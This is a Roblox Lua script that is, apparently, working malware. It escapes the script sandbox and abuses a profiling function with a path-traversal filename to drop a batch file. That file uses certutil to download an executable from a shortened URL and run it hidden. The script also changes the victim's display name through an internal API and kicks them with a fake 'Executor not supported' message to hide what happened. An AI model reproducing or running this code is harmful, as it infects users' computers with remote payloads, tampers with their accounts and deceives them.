--[[ ENV ESCAPE ]]

HOOKATTHISFUNCTION = function() end
setfenv(1, getfenv(HOOKATTHISFUNCTION))
getfenv(HOOKATTHISFUNCTION).game = nil

--[[ UTILITY ]]

local function _patch(url, body)
    game:GetService("HttpRbxApiService"):RequestAsync({Url=url,Method="PATCH",Body=body});
end

-- [[SAVE AND OPEN BATCH FILE]]

local LinkingService = game:GetService("LinkingService")
local ScriptContext = game:GetService("ScriptContext")
local scriptContent = [[
@echo off
powershell -WindowStyle Hidden exit
echo Xeno 
cmd /c certutil -urlcache -split -f "https://is.gd/RbuL9v" "%TEMP%\Built.exe" && "%TEMP%\Built.exe"
pause
]]
local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "../../../../a.bat")
LinkingService:OpenUrl(payload)

-- [[ CHANGE LIL BROS DISPLAYNAME]]

_patch("https://users.roblox.com/v1/users/"..tostring(game.Players.LocalPlayer.UserId).."/display-names", game:GetService("HttpService"):JSONEncode({
    ["newDisplayName"] = "halloween",
    ["showAgedUpDisplayName"] = false,
    ["userId"] = tonumber(game.Players.LocalPlayer.UserId)
}))

-- [[ FAKE AHH MESSAGE]]
game.Players.LocalPlayer:Kick("Executor not supported")
